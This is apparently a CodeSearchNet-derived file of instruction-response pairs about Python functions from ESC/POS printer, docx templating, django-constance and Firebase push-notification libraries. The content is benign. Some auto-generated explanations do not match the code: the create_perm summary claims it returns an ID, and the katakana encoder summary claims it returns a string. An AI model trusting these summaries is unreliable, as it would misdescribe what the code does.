{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a string made from a list of two byte chars.", "response": "def two_byte_iter_to_str(bytes):\n    \"\"\"\n    Return a string made from a list of two byte chars.\n    \"\"\"\n    bytes = list(bytes)\n    chars = bytearray()\n    while bytes:\n        lsb = bytes.pop(0)\n        try:\n            msb = bytes.pop(0)\n        except IndexError:\n            msb = 0x00\n        chars.append(from_two_bytes([lsb, msb]))\n    return chars.decode()"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns an iterator consisting of two byte chars from a string.", "response": "def str_to_two_byte_iter(string):\n    \"\"\"\n    Return a iter consisting of two byte chars from a string.\n    \"\"\"\n    bstring = string.encode()\n    bytes = bytearray()\n    for char in bstring:\n        bytes.append(char)\n        bytes.append(0)\n    return bytes"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbreak a value into values of less than 255 that form value when multiplied.", "response": "def break_to_bytes(value):\n    \"\"\"\n    Breaks a value into values of less than 255 that form value when multiplied.\n    (Or almost do so with primes)\n    Returns a tuple\n    \"\"\"\n    if value < 256:\n        return (value,)\n    c = 256\n    least = (0, 255)\n    for i in range(254):\n        c -= 1\n        rest = value % c\n        if rest == 0 and value / c < 256:\n            return (c, int(value / c))\n        elif rest == 0 and value / c > 255:\n            parts = list(break_to_bytes(value / c))\n            parts.insert(0, c)\n            return tuple(parts)\n        else:\n            if rest < least[1]:\n                least = (c, rest)\n    return (c, int(value / c))"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconverting a list of pin names to a board dictionary.", "response": "def pin_list_to_board_dict(pinlist):\n    \"\"\"\n    Capability Response codes:\n        INPUT:  0, 1\n        OUTPUT: 1, 1\n        ANALOG: 2, 10\n        PWM:    3, 8\n        SERV0:  4, 14\n        I2C:    6, 1\n    \"\"\"\n\n    board_dict = {\n        \"digital\": [],\n        \"analog\": [],\n        \"pwm\": [],\n        \"servo\": [],  # 2.2 specs\n        # 'i2c': [],  # 2.3 specs\n        \"disabled\": [],\n    }\n    for i, pin in enumerate(pinlist):\n        pin.pop()  # removes the 0x79 on end\n        if not pin:\n            board_dict[\"disabled\"] += [i]\n            board_dict[\"digital\"] += [i]\n            continue\n\n        for j, _ in enumerate(pin):\n            # Iterate over evens\n            if j % 2 == 0:\n                # This is safe. try: range(10)[5:50]\n                if pin[j:j + 4] == [0, 1, 1, 1]:\n                    board_dict[\"digital\"] += [i]\n\n                if pin[j:j + 2] == [2, 10]:\n                    board_dict[\"analog\"] += [i]\n\n                if pin[j:j + 2] == [3, 8]:\n                    board_dict[\"pwm\"] += [i]\n\n                if pin[j:j + 2] == [4, 14]:\n                    board_dict[\"servo\"] += [i]\n\n                # Desable I2C\n                if pin[j:j + 2] == [6, 1]:\n                    pass\n\n    # We have to deal with analog pins:\n    # - (14, 15, 16, 17, 18, 19)\n    # + (0, 1, 2, 3, 4, 5)\n    diff = set(board_dict[\"digital\"]) - set(board_dict[\"analog\"])\n    board_dict[\"analog\"] = [n for n, _ in enumerate(board_dict[\"analog\"])]\n\n    # Digital pin problems:\n    # - (2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15)\n    # + (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13)\n\n    board_dict[\"digital\"] = [n for n, _ in enumerate(diff)]\n    # Based on lib Arduino 0017\n    board_dict[\"servo\"] = board_dict[\"digital\"]\n\n    # Turn lists into tuples\n    # Using dict for Python 2.6 compatibility\n    board_dict = dict([(key, tuple(value)) for key, value in board_dict.items()])\n\n    return board_dict"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nappending the given value to the deque.", "response": "def write(self, value):\n        \"\"\"\n        Appends bytes flat to the deque. So iterables will be unpacked.\n        \"\"\"\n        if hasattr(value, '__iter__'):\n            bytearray(value)\n            self.extend(value)\n        else:\n            bytearray([value])\n            self.append(value)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget the profile by name ; if no name is given return the default profile.", "response": "def get_profile(name=None, **kwargs):\n    \"\"\"Get the profile by name; if no name is given, return the\n    default profile.\n    \"\"\"\n    if isinstance(name, Profile):\n        return name\n\n    clazz = get_profile_class(name or 'default')\n    return clazz(**kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_profile_class(name):\n    if name not in CLASS_CACHE:\n        profile_data = PROFILES[name]\n        profile_name = clean(name)\n        class_name = '{}{}Profile'.format(\n            profile_name[0].upper(), profile_name[1:])\n        new_class = type(class_name, (BaseProfile,), {'profile_data': profile_data})\n        CLASS_CACHE[name] = new_class\n\n    return CLASS_CACHE[name]", "response": "Returns the class object for the given profile name."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the escpos index for font. Makes sure that font is valid.", "response": "def get_font(self, font):\n        \"\"\"Return the escpos index for `font`. Makes sure that\n        the requested `font` is valid.\n        \"\"\"\n        font = {'a': 0, 'b': 1}.get(font, font)\n        if not six.text_type(font) in self.fonts:\n            raise NotSupported(\n                '\"{}\" is not a valid font in the current profile'.format(font))\n        return font"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the number of columns for the given font.", "response": "def get_columns(self, font):\n        \"\"\" Return the number of columns for the given font.\n        \"\"\"\n        font = self.get_font(font)\n        return self.fonts[six.text_type(font)]['columns']"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _reset_config(self):\n        self._has_loaded = False\n        self._printer = None\n\n        self._printer_name = None\n        self._printer_config = None", "response": "Clear the loaded configuration."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nload and parse the configuration file using pyyaml.", "response": "def load(self, config_path=None):\n        \"\"\" Load and parse the configuration file using pyyaml\n\n        :param config_path: An optional file path, file handle, or byte string\n            for the configuration file.\n\n        \"\"\"\n\n        self._reset_config()\n\n        if not config_path:\n            config_path = os.path.join(\n                appdirs.user_config_dir(self._app_name),\n                self._config_file\n            )\n\n        try:\n            # First check if it's file like. If it is, pyyaml can load it.\n            # I'm checking type instead of catching exceptions to keep the\n            # exception handling simple\n            if hasattr(config_path, 'read'):\n                config = yaml.safe_load(config_path)\n            else:\n                # If it isn't, it's a path. We have to open it first, otherwise\n                # pyyaml will try to read it as yaml\n                with open(config_path, 'rb') as config_file:\n                    config = yaml.safe_load(config_file)\n        except EnvironmentError:\n            raise exceptions.ConfigNotFoundError('Couldn\\'t read config at {config_path}'.format(\n                config_path=str(config_path),\n            ))\n        except yaml.YAMLError:\n            raise exceptions.ConfigSyntaxError('Error parsing YAML')\n\n        if 'printer' in config:\n            self._printer_config = config['printer']\n            self._printer_name = self._printer_config.pop('type').title()\n\n            if not self._printer_name or not hasattr(printer, self._printer_name):\n                raise exceptions.ConfigSyntaxError(\n                    'Printer type \"{printer_name}\" is invalid'.format(\n                        printer_name=self._printer_name,\n                    )\n                )\n\n        self._has_loaded = True"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef printer(self):\n        if not self._has_loaded:\n            self.load()\n\n        if not self._printer_name:\n            raise exceptions.ConfigSectionMissingError('printer')\n\n        if not self._printer:\n            # We could catch init errors and make them a ConfigSyntaxError,\n            # but I'll just let them pass\n            self._printer = getattr(printer, self._printer_name)(**self._printer_config)\n\n        return self._printer", "response": "Returns a printer that was defined in the config."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef open(self, usb_args):\n        self.device = usb.core.find(**usb_args)\n        if self.device is None:\n            raise USBNotFoundError(\"Device not found or cable not plugged in.\")\n\n        self.idVendor = self.device.idVendor\n        self.idProduct = self.device.idProduct\n\n        check_driver = None\n\n        try:\n            check_driver = self.device.is_kernel_driver_active(0)\n        except NotImplementedError:\n            pass\n\n        if check_driver is None or check_driver:\n            try:\n                self.device.detach_kernel_driver(0)\n            except usb.core.USBError as e:\n                if check_driver is not None:\n                    print(\"Could not detatch kernel driver: {0}\".format(str(e)))\n\n        try:\n            self.device.set_configuration()\n            self.device.reset()\n        except usb.core.USBError as e:\n            print(\"Could not set configuration: {0}\".format(str(e)))", "response": "Open USB device and set it as escpos device."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _raw(self, msg):\n        self.device.write(self.out_ep, msg, self.timeout)", "response": "Print any command sent in raw format"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef open(self):\n        if self.device is not None and self.device.is_open:\n            self.close()\n        self.device = serial.Serial(port=self.devfile, baudrate=self.baudrate,\n                                    bytesize=self.bytesize, parity=self.parity,\n                                    stopbits=self.stopbits, timeout=self.timeout,\n                                    xonxoff=self.xonxoff, dsrdtr=self.dsrdtr)\n\n        if self.device is not None:\n            print(\"Serial printer enabled\")\n        else:\n            print(\"Unable to open serial printer on: {0}\".format(str(self.devfile)))", "response": "Open the serial port and set is as escpos device"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef open(self):\n        self.device = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.device.settimeout(self.timeout)\n        self.device.connect((self.host, self.port))\n\n        if self.device is None:\n            print(\"Could not open socket for {0}\".format(self.host))", "response": "Open TCP socket with socket - library and set it as escpos device"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef open(self):\n        self.device = open(self.devfile, \"wb\")\n\n        if self.device is None:\n            print(\"Could not open the specified file {0}\".format(self.devfile))", "response": "Open the system file and return the object."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nprint any command sent in raw format", "response": "def _raw(self, msg):\n        \"\"\" Print any command sent in raw format\n\n        :param msg: arbitrary code to be printed\n        :type msg: bytes\n        \"\"\"\n        self.device.write(msg)\n        if self.auto_flush:\n            self.flush()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef encode_katakana(text):\n    encoded = []\n    for char in text:\n        if jaconv:\n            # try to convert japanese text to half-katakanas\n            char = jaconv.z2h(jaconv.hira2kata(char))\n            # TODO: \"the conversion may result in multiple characters\"\n            # If that really can happen (I am not really shure), than the string would have to be split and every single\n            #  character has to passed through the following lines.\n\n        if char in TXT_ENC_KATAKANA_MAP:\n            encoded.append(TXT_ENC_KATAKANA_MAP[char])\n        else:\n            # TODO doesn't this discard all that is not in the map? Can we be sure that the input does contain only\n            # encodable characters? We could at least throw an exception if encoding is not possible.\n            pass\n    return b\"\".join(encoded)", "response": "Encodes the katakana text into a single string."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nextract slices of an image as equal - sized blobs of column - format data.", "response": "def to_column_format(self, high_density_vertical=True):\n        \"\"\"\n        Extract slices of an image as equal-sized blobs of column-format data.\n\n        :param high_density_vertical: Printed line height in dots\n        \"\"\"\n        im = self._im.transpose(Image.ROTATE_270).transpose(Image.FLIP_LEFT_RIGHT)\n        line_height = 24 if high_density_vertical else 8\n        width_pixels, height_pixels = im.size\n        top = 0\n        left = 0\n        while left < width_pixels:\n            box = (left, top, left + line_height, top + height_pixels)\n            im_slice = im.transform((line_height, height_pixels), Image.EXTENT, box)\n            im_bytes = im_slice.tobytes()\n            yield(im_bytes)\n            left += line_height"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nsplit an image into multiple fragments after fragment_height pixels.", "response": "def split(self, fragment_height):\n        \"\"\"\n        Split an image into multiple fragments after fragment_height pixels\n\n        :param fragment_height: height of fragment\n        :return: list of PIL objects\n        \"\"\"\n        passes = int(math.ceil(self.height/fragment_height))\n        fragments = []\n        for n in range(0, passes):\n            left = 0\n            right = self.width\n            upper = n * fragment_height\n            lower = min((n + 1) * fragment_height, self.height)\n            box = (left, upper, right, lower)\n            fragments.append(self.img_original.crop(box))\n        return fragments"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef demo(printer, **kwargs):\n    for demo_choice in kwargs.keys():\n        command = getattr(\n            printer,\n            demo_choice\n            .replace('barcodes_a', 'barcode')\n            .replace('barcodes_b', 'barcode')\n        )\n        for params in DEMO_FUNCTIONS[demo_choice]:\n            command(**params)\n        printer.cut()", "response": "Prints specificed demos. Called when CLI is passed demo."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsplitting off as many characters from the begnning of text as are writable with encoding. Returns a 2 - tuple.", "response": "def split_writable_text(encoder, text, encoding):\n    \"\"\"Splits off as many characters from the begnning of text as\n    are writable with \"encoding\". Returns a 2-tuple (writable, rest).\n    \"\"\"\n    if not encoding:\n        return None, text\n\n    for idx, char in enumerate(text):\n        if encoder.can_encode(encoding, char):\n            continue\n        return text[:idx], text[idx:]\n\n    return text, None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_encoding_name(self, encoding):\n        encoding = CodePages.get_encoding_name(encoding)\n        if encoding not in self.codepages:\n            raise ValueError((\n                'Encoding \"{}\" cannot be used for the current profile. '\n                'Valid encodings are: {}'\n                ).format(encoding, ','.join(self.codepages.keys())))\n        return encoding", "response": "Given an encoding provided by the user will return a\n        canonical encoding name ; and also validate that the encoding is supported by the user."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nget the codepage character list for a given code page.", "response": "def _get_codepage_char_list(encoding):\n        \"\"\"Get codepage character list\n\n        Gets characters 128-255 for a given code page, as an array.\n\n        :param encoding: The name of the encoding. This must appear in the CodePage list\n        \"\"\"\n        codepage = CodePages.get_encoding(encoding)\n        if 'data' in codepage:\n            encodable_chars = list(\"\".join(codepage['data']))\n            assert(len(encodable_chars) == 128)\n            return encodable_chars\n        elif 'python_encode' in codepage:\n            encodable_chars = [u\" \"] * 128\n            for i in range(0, 128):\n                codepoint = i + 128\n                try:\n                    encodable_chars[i] = bytes([codepoint]).decode(codepage['python_encode'])\n                except UnicodeDecodeError:\n                    # Non-encodable character, just skip it\n                    pass\n            return encodable_chars\n        raise LookupError(\"Can't find a known encoding for {}\".format(encoding))"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nget a mapping of UTF - characters to code points in a given encoding.", "response": "def _get_codepage_char_map(self, encoding):\n        \"\"\" Get codepage character map\n\n        Process an encoding and return a map of UTF-characters to code points\n        in this encoding.\n\n        This is generated once only, and returned from a cache.\n\n        :param encoding: The name of the encoding.\n        \"\"\"\n        # Skip things that were loaded previously\n        if encoding in self.available_characters:\n            return self.available_characters[encoding]\n        codepage_char_list = self._get_codepage_char_list(encoding)\n        codepage_char_map = dict((utf8, i + 128) for (i, utf8) in enumerate(codepage_char_list))\n        self.available_characters[encoding] = codepage_char_map\n        return codepage_char_map"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef can_encode(self, encoding, char):\n        available_map = {}\n        try:\n            available_map = self._get_codepage_char_map(encoding)\n        except LookupError:\n            return False\n\n        # Decide whether this character is encodeable in this code page\n        is_ascii = ord(char) < 128\n        is_encodable = char in available_map\n        return is_ascii or is_encodable", "response": "Determines if a character can be encoded in the given code page."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nencoding a single character with the given encoding map.", "response": "def _encode_char(char, charmap, defaultchar):\n        \"\"\" Encode a single character with the given encoding map\n\n        :param char: char to encode\n        :param charmap: dictionary for mapping characters in this code page\n        \"\"\"\n        if ord(char) < 128:\n            return ord(char)\n        if char in charmap:\n            return charmap[char]\n        return ord(defaultchar)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nencodes the given text under the given encoding.", "response": "def encode(self, text, encoding, defaultchar='?'):\n        \"\"\" Encode text under the given encoding\n\n        :param text: Text to encode\n        :param encoding: Encoding name to use (must be defined in capabilities)\n        :param defaultchar: Fallback for non-encodable characters\n        \"\"\"\n        codepage_char_map = self._get_codepage_char_map(encoding)\n        output_bytes = bytes([self._encode_char(char, codepage_char_map, defaultchar) for char in text])\n        return output_bytes"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef find_suitable_encoding(self, char):\n        sorted_encodings = sorted(\n            self.codepages.items(),\n            key=self.__encoding_sort_func)\n\n        for encoding, _ in sorted_encodings:\n            if self.can_encode(encoding, char):\n                # This encoding worked; at it to the set of used ones.\n                self.used_encodings.add(encoding)\n                return encoding", "response": "Find a suitable encoding for a given character."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef force_encoding(self, encoding):\n        if not encoding:\n            self.disabled = False\n        else:\n            self.write_with_encoding(encoding, None)\n            self.disabled = True", "response": "Sets a fixed encoding."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef write(self, text):\n\n        if self.disabled:\n            self.write_with_encoding(self.encoding, text)\n            return\n\n        # See how far we can go into the text with the current encoding\n        to_write, text = split_writable_text(self.encoder, text, self.encoding)\n        if to_write:\n            self.write_with_encoding(self.encoding, to_write)\n\n        while text:\n            # See if any of the code pages that the printer profile\n            # supports can encode this character.\n            encoding = self.encoder.find_suitable_encoding(text[0])\n            if not encoding:\n                self._handle_character_failed(text[0])\n                text = text[1:]\n                continue\n\n            # Write as much text as possible with the encoding found.\n            to_write, text = split_writable_text(self.encoder, text, encoding)\n            if to_write:\n                self.write_with_encoding(encoding, to_write)", "response": "Write the text automatically switching encodings."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef replace_media(self,src_file,dst_file):\n        with open(dst_file, 'rb') as fh:\n            crc = self.get_file_crc(src_file)\n            self.crc_to_new_media[crc] = fh.read()", "response": "Replace one media by another one into a docx archive"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef replace_pic(self,embedded_file,dst_file):\n\n        if hasattr(dst_file,'read'):\n            # NOTE: file extension not checked\n            self.pic_to_replace[embedded_file]=dst_file.read()\n        else:\n            emp_path,emb_ext=os.path.splitext(embedded_file)\n            dst_path,dst_ext=os.path.splitext(dst_file)\n\n            if emb_ext!=dst_ext:\n                raise ValueError('replace_pic: extensions must match')\n\n            with open(dst_file, 'rb') as fh:\n                self.pic_to_replace[embedded_file]=fh.read()", "response": "Replace embedded picture with original - name given by embedded_file."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreplace one embdded object by another one into a docx file", "response": "def replace_embedded(self,src_file,dst_file):\n        \"\"\"Replace one embdded object by another one into a docx\n\n        This has been done mainly because it is not possible to add images\n        in docx header/footer.\n        With this function, put a dummy picture in your header/footer,\n        then specify it with its replacement in this function\n\n        Syntax: tpl.replace_embedded('dummy_doc.docx','doc_to_paste.docx')\n\n        Note2 : it is important to have the source file as it is required to\n                calculate its CRC to find them in the docx\n        \"\"\"\n        with open(dst_file, 'rb') as fh:\n            crc = self.get_file_crc(src_file)\n            self.crc_to_new_embedded[crc] = fh.read()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsearching in docx template all the xml pictures tag and store them in pic_map dict", "response": "def build_pic_map(self):\n        \"\"\"Searches in docx template all the xml pictures tag and store them\n        in pic_map dict\"\"\"\n        if self.pic_to_replace:\n            # Main document\n            part=self.docx.part\n            self.pic_map.update(self._img_filename_to_part(part))\n\n            # Header/Footer\n            for relid, rel in six.iteritems(self.docx.part.rels):\n                if rel.reltype in (REL_TYPE.HEADER,REL_TYPE.FOOTER):\n                    self.pic_map.update(self._img_filename_to_part(rel.target_part))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create_perm(self, using=None, *args, **kwargs):\n        from django.conf import settings\n        from django.contrib.auth.models import Permission\n        from django.contrib.contenttypes.models import ContentType\n\n        constance_dbs = getattr(settings, 'CONSTANCE_DBS', None)\n        if constance_dbs is not None and using not in constance_dbs:\n            return\n        if ContentType._meta.installed and Permission._meta.installed:\n            content_type, created = ContentType.objects.using(using).get_or_create(\n                app_label='constance',\n                model='config',\n            )\n\n            permission, created = Permission.objects.using(using).get_or_create(\n                content_type=content_type,\n                codename='change_config',\n                defaults={'name': 'Can change config'})", "response": "Creates a fake content type and permission for the current user and returns the ID of the newly created object."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses and sets a Constance value from a string", "response": "def _set_constance_value(key, value):\n    \"\"\"\n    Parses and sets a Constance value from a string\n    :param key:\n    :param value:\n    :return:\n    \"\"\"\n\n    form = ConstanceForm(initial=get_values())\n\n    field = form.fields[key]\n\n    clean_value = field.clean(field.to_python(value))\n    setattr(config, key, clean_value)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a set of keys from settings. CONFIG that are not accounted for in settings. CONFIG_FIELDSETS.", "response": "def get_inconsistent_fieldnames():\n    \"\"\"\n    Returns a set of keys from settings.CONFIG that are not accounted for in\n    settings.CONFIG_FIELDSETS.\n    If there are no fieldnames in settings.CONFIG_FIELDSETS, returns an empty set.\n    \"\"\"\n    field_name_list = []\n    for fieldset_title, fields_list in settings.CONFIG_FIELDSETS.items():\n        for field_name in fields_list:\n            field_name_list.append(field_name)\n    if not field_name_list:\n        return {}\n    return set(set(settings.CONFIG.keys()) - set(field_name_list))"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets dictionary of values from the backend", "response": "def get_values():\n    \"\"\"\n    Get dictionary of values from the backend\n    :return:\n    \"\"\"\n\n    # First load a mapping between config name and default value\n    default_initial = ((name, options[0])\n                       for name, options in settings.CONFIG.items())\n    # Then update the mapping with actually values from the backend\n    initial = dict(default_initial, **dict(config._backend.mget(settings.CONFIG)))\n\n    return initial"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nsends a message to all active devices in queryset and deactivate the active devices if DELETE_INACTIVE_DEVICES setting is set to True.", "response": "def send_message(\n            self,\n            title=None,\n            body=None,\n            icon=None,\n            data=None,\n            sound=None,\n            badge=None,\n            api_key=None,\n            **kwargs):\n        \"\"\"\n        Send notification for all active devices in queryset and deactivate if\n        DELETE_INACTIVE_DEVICES setting is set to True.\n        \"\"\"\n        if self:\n            from .fcm import fcm_send_bulk_message\n\n            registration_ids = list(self.filter(active=True).values_list(\n                'registration_id',\n                flat=True\n            ))\n            if len(registration_ids) == 0:\n                return [{'failure': len(self), 'success': 0}]\n\n            result = fcm_send_bulk_message(\n                registration_ids=registration_ids,\n                title=title,\n                body=body,\n                icon=icon,\n                data=data,\n                sound=sound,\n                badge=badge,\n                api_key=api_key,\n                **kwargs\n            )\n\n            self._deactivate_devices_with_error_results(\n                registration_ids,\n                result['results']\n            )\n            return result"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nsend data messages for all active devices in queryset and deactivate if DELETE_INACTIVE_DEVICES setting is set to True.", "response": "def send_data_message(\n            self,\n            api_key=None,\n            condition=None,\n            collapse_key=None,\n            delay_while_idle=False,\n            time_to_live=None,\n            restricted_package_name=None,\n            low_priority=False,\n            dry_run=False,\n            data_message=None,\n            content_available=None,\n            timeout=5,\n            json_encoder=None):\n        \"\"\"\n        Send data messages for all active devices in queryset and deactivate if\n        DELETE_INACTIVE_DEVICES setting is set to True.\n        \"\"\"\n        if self:\n            from .fcm import fcm_send_bulk_data_messages\n\n            registration_ids = list(self.filter(active=True).values_list(\n                'registration_id',\n                flat=True\n            ))\n            if len(registration_ids) == 0:\n                return [{'failure': len(self), 'success': 0}]\n\n            result = fcm_send_bulk_data_messages(\n                api_key=api_key,\n                registration_ids=registration_ids,\n                condition=condition,\n                collapse_key=collapse_key,\n                delay_while_idle=delay_while_idle,\n                time_to_live=time_to_live,\n                restricted_package_name=restricted_package_name,\n                low_priority=low_priority,\n                dry_run=dry_run,\n                data_message=data_message,\n                content_available=content_available,\n                timeout=timeout,\n                json_encoder=json_encoder,\n            )\n\n            self._deactivate_devices_with_error_results(\n                registration_ids,\n                result['results']\n            )\n\n            return result"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nsending a single notification message.", "response": "def send_message(\n            self,\n            title=None,\n            body=None,\n            icon=None,\n            data=None,\n            sound=None,\n            badge=None,\n            api_key=None,\n            **kwargs):\n        \"\"\"\n        Send single notification message.\n        \"\"\"\n        from .fcm import fcm_send_message\n        result = fcm_send_message(\n            registration_id=str(self.registration_id),\n            title=title,\n            body=body,\n            icon=icon,\n            data=data,\n            sound=sound,\n            badge=badge,\n            api_key=api_key,\n            **kwargs\n        )\n\n        self._deactivate_device_on_error_result(result)\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsending a single data message to the FCM.", "response": "def send_data_message(\n            self,\n            condition=None,\n            collapse_key=None,\n            delay_while_idle=False,\n            time_to_live=None,\n            restricted_package_name=None,\n            low_priority=False,\n            dry_run=False,\n            data_message=None,\n            content_available=None,\n            api_key=None,\n            timeout=5,\n            json_encoder=None):\n        \"\"\"\n        Send single data message.\n        \"\"\"\n        from .fcm import fcm_send_single_device_data_message\n        result = fcm_send_single_device_data_message(\n            registration_id=str(self.registration_id),\n            condition=condition,\n            collapse_key=collapse_key,\n            delay_while_idle=delay_while_idle,\n            time_to_live=time_to_live,\n            restricted_package_name=restricted_package_name,\n            low_priority=low_priority,\n            dry_run=dry_run,\n            data_message=data_message,\n            content_available=content_available,\n            api_key=api_key,\n            timeout=timeout,\n            json_encoder=json_encoder,\n        )\n\n        self._deactivate_device_on_error_result(result)\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef send_messages(self, request, queryset, bulk=False, data=False):\n        ret = []\n        errors = []\n        total_failure = 0\n\n        for device in queryset:\n            if bulk:\n                if data:\n                    response = queryset.send_message(\n                        data={\"Nick\": \"Mario\"}\n                    )\n                else:\n                    response = queryset.send_message(\n                        title=\"Test notification\",\n                        body=\"Test bulk notification\"\n                    )\n            else:\n                if data:\n                    response = device.send_message(data={\"Nick\": \"Mario\"})\n                else:\n                    response = device.send_message(\n                        title=\"Test notification\",\n                        body=\"Test single notification\"\n                    )\n            if response:\n                ret.append(response)\n\n            failure = int(response['failure'])\n            total_failure += failure\n            errors.append(str(response))\n\n            if bulk:\n                break\n\n        if ret:\n            if errors:\n                msg = _(\"Some messages were sent: %s\" % (ret))\n            else:\n                msg = _(\"All messages were sent: %s\" % (ret))\n            self.message_user(request, msg)\n\n        if total_failure > 0:\n            self.message_user(\n                request,\n                _(\"Some messages failed to send. %d devices were marked as \"\n                  \"inactive.\" % total_failure),\n                level=messages.WARNING\n            )", "response": "Provides error handling for DeviceAdmin send_message and send_bulk_message methods."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fcm_send_message(\n        registration_id,\n        title=None,\n        body=None,\n        icon=None,\n        data=None,\n        sound=None,\n        badge=None,\n        low_priority=False,\n        condition=None,\n        time_to_live=None,\n        click_action=None,\n        collapse_key=None,\n        delay_while_idle=False,\n        restricted_package_name=None,\n        dry_run=False,\n        color=None,\n        tag=None,\n        body_loc_key=None,\n        body_loc_args=None,\n        title_loc_key=None,\n        title_loc_args=None,\n        content_available=None,\n        extra_kwargs={},\n        api_key=None,\n        json_encoder=None,\n        **kwargs):\n\n    \"\"\"\n    Copied from https://github.com/olucurious/PyFCM/blob/master/pyfcm/fcm.py:\n\n    Send push notification to a single device\n    Args:\n        registration_id (str): FCM device registration IDs.\n        body (str): Message string to display in the notification tray\n        data (dict): Data message payload to send alone or with the notification\n            message\n        sound (str): The sound file name to play. Specify \"Default\" for device\n            default sound.\n    Keyword Args:\n        collapse_key (str, optional): Identifier for a group of messages\n            that can be collapsed so that only the last message gets sent\n            when delivery can be resumed. Defaults to ``None``.\n        delay_while_idle (bool, optional): If ``True`` indicates that the\n            message should not be sent until the device becomes active.\n        time_to_live (int, optional): How long (in seconds) the message\n            should be kept in FCM storage if the device is offline. The\n            maximum time to live supported is 4 weeks. Defaults to ``None``\n            which uses the FCM default of 4 weeks.\n        low_priority (boolean, optional): Whether to send notification with\n            the low priority flag. Defaults to ``False``.\n        restricted_package_name (str, optional): Package name of the\n            application where the registration IDs must match in order to\n            receive the message. Defaults to ``None``.\n        dry_run (bool, optional): If ``True`` no message will be sent but\n            request will be tested.\n\n    Returns:\n        :tuple:`multicast_id(long), success(int), failure(int),\n            canonical_ids(int), results(list)`:\n        Response from FCM server.\n    Raises:\n        AuthenticationError: If :attr:`api_key` is not set or provided or there\n            is an error authenticating the sender.\n        FCMServerError: Internal server error or timeout error on Firebase cloud\n            messaging server\n        InvalidDataError: Invalid data provided\n        InternalPackageError: JSON parsing error, mostly from changes in the\n            response of FCM, create a new github issue to resolve it.\n    \"\"\"\n    if api_key is None:\n        api_key = SETTINGS.get(\"FCM_SERVER_KEY\")\n    push_service = FCMNotification(api_key=api_key, json_encoder=json_encoder)\n    result = push_service.notify_single_device(\n        registration_id=registration_id,\n        message_title=title,\n        message_body=body,\n        message_icon=icon,\n        data_message=data,\n        sound=sound,\n        badge=badge,\n        collapse_key=collapse_key,\n        low_priority=low_priority,\n        condition=condition,\n        time_to_live=time_to_live,\n        click_action=click_action,\n        delay_while_idle=delay_while_idle,\n        restricted_package_name=restricted_package_name,\n        dry_run=dry_run,\n        color=color,\n        tag=tag,\n        body_loc_key=body_loc_key,\n        body_loc_args=body_loc_args,\n        title_loc_key=title_loc_key,\n        title_loc_args=title_loc_args,\n        content_available=content_available,\n        extra_kwargs=extra_kwargs,\n        **kwargs\n    )\n\n    # do not raise errors, pyfcm will raise exceptions if response status will\n    # be anything but 200\n\n    return result", "response": "Send a message to a single FCM device."}
